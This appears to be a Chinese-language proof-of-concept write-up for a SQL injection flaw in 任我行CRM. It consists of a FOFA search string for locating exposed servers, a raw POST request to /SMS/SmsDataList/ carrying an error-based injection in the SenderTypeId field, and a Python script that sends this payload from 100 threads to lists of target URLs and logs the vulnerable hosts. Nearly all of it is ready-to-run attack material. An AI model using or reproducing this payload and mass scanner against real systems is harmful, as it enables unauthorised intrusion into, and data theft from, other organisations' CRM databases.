### fofa

```markdown
"欢迎使用任我行CRM"
```

### payload

```markdown
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&StartSendDate=2024-06-17&EndSendDate=2024-06-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```

![image-20240910194515060](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240910194515060.png)

### 命令

```markdown
python3 脚本文件名 -u url			  # 测试单个url
python3 脚本文件名 -f url.txt          # 测试多个url
```

### poc

```python
import sys, requests, time, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-10
                                                    version: 1.0.0
                                                    author: hulless-oat                    
"""
    print(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="任我行CRM系统存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload = '/SMS/SmsDataList/?pageIndex=1&pageSize=30'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '170',
    }
    data = {
        'Keywords': '',
        'StartSendDate': '2024-06-17',
        'EndSendDate': '2024-06-17',
        'SenderTypeId': "0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=5, verify=False)
        if res.status_code == 200 and "message" in res.text:
            print(f"{GREEN}[+]该网站存在SQL注入漏洞： {target}\n{RESET}")
            with open("result.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口点
if __name__ == '__main__':
    main()
```

